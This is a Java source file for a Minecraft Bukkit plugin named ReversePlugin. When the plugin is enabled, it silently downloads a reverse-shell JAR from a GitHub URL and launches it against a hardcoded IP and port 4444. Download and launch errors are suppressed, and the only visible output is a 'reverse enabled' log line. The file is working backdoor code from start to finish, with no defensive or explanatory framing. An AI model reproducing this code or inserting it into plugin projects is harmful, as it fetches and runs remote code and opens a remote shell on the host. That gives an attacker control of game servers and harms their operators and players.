package com.example.reverseplugin;

import org.bukkit.plugin.java.JavaPlugin;
import java.io.File;
import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.file.Files;
import java.nio.file.StandardCopyOption;
import java.util.ArrayList;
import java.util.List;

public class ReversePlugin extends JavaPlugin {
    private static final String IP = "127.0.0.1"; // Hardcoded IP
    private static final int PORT = 4444; // Hardcoded port
    private Process process;

    @Override
    public void onEnable() {
        File dataFolder = getDataFolder();
        if (!dataFolder.exists()) {
            dataFolder.mkdirs();
        }
        downloadJarIfNeeded();
        startReverseShell();
        getLogger().info("reverse enabled");
    }

    @Override
    public void onDisable() {
        if (process != null) {
            process.destroy();
        }
    }

    private void downloadJarIfNeeded() {
        File jarFile = new File(getDataFolder(), "reverse.jar");
        if (!jarFile.exists()) {
            try {
                URL url = new URL("https://raw.githubusercontent.com/ivan-sincek/java-reverse-tcp/refs/heads/main/jar/Reverse_Shell.jar");
                HttpURLConnection connection = (HttpURLConnection) url.openConnection();
                if (connection.getResponseCode() == HttpURLConnection.HTTP_OK) {
                    Files.copy(connection.getInputStream(), jarFile.toPath(), StandardCopyOption.REPLACE_EXISTING);
                }
            } catch (IOException e) {
                // Silently ignore errors
            }
        }
    }

    private void startReverseShell() {
        File jarFile = new File(getDataFolder(), "reverse.jar");
        if (jarFile.exists()) {
            List<String> command = new ArrayList<>();
            command.add("java");
            command.add("-jar");
            command.add(jarFile.getAbsolutePath());
            command.add(IP);
            command.add(String.valueOf(PORT));
            ProcessBuilder pb = new ProcessBuilder(command);
            pb.directory(getDataFolder());
            try {
                process = pb.start();
            } catch (IOException e) {
                // Silently ignore errors
            }
        }
    }
}